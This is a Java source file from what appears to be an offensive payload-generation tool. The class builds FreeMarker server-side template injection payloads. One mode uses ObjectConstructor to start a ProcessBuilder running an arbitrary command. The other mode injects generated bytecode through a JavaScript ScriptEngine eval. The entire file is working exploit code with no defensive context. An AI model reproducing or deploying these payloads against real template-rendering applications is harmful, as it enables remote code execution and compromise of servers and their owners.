package cn.butler.template.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.PayloadRunner;
import cn.butler.thirdparty.payloads.expression.JSExpression;

public class FreeMarkerObjectConstructor implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        String[] parts = command.split(":", 2);
        String objectConstructor = "";
        if(parts[0].equals("cmd")){
            objectConstructor = String.format("<#assign value=\"freemarker.template.utility.ObjectConstructor\"?new()>${value(\"java.lang.ProcessBuilder\",\"%s\").start()}",parts[1]);
        } else if (parts[0].equals("JSExpression")){
            Object[] objects = (Object [])ObjectPayload.Utils.makePayloadObject("ThirdPartyAttack","CustomClass",parts[1]);
            byte[] byteCode = (byte[]) objects[1];
            String jsExpression = JSExpression.commonExpressModify(byteCode);
            objectConstructor = String.format("${\"freemarker.template.utility.ObjectConstructor\"?new()(\"javax.script.ScriptEngineManager\").getEngineByName(\"js\").eval(\"%s\")}",jsExpression);
        }else {
            return null;
        }
        return objectConstructor;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(FreeMarkerObjectConstructor.class, args);
    }
}
